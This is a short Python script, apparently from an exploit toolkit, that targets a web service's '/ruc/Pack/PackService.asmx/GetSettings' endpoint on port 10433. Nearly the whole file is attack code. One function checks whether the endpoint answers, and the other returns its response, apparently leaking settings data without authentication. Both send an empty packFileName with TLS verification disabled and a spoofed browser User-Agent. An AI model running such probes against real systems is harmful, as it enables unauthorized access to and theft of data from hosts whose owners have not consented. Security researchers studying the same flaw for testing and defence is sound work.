

import requests


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/json; charset=UTF-8',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Content-Length': '19',

}

def exp_check(url:str):
    try:
        url = url.split(":")
        url = url[0]+ ":"+url[1] + ":10433/"
        payload = "/ruc/Pack/PackService.asmx/GetSettings?ver=&cache="
        data = '{"packFileName":""}'
        re =requests.post(url + payload,headers=headers,data=data,verify=False)
        if re.status_code == 200:
            return 1
        else:
            return 2
    except:
        return 3

def exp_others(url):
    try:
        url = url.split(":")
        url = url[0]+ ":"+url[1] + ":10433/"
        payload = "/ruc/Pack/PackService.asmx/GetSettings?ver=&cache="
        data = '{"packFileName":""}'
        re =requests.get(url + payload,headers=headers,data=data,verify=False)
        if re.status_code == 200:
            return re.text
    except:
        return 3
    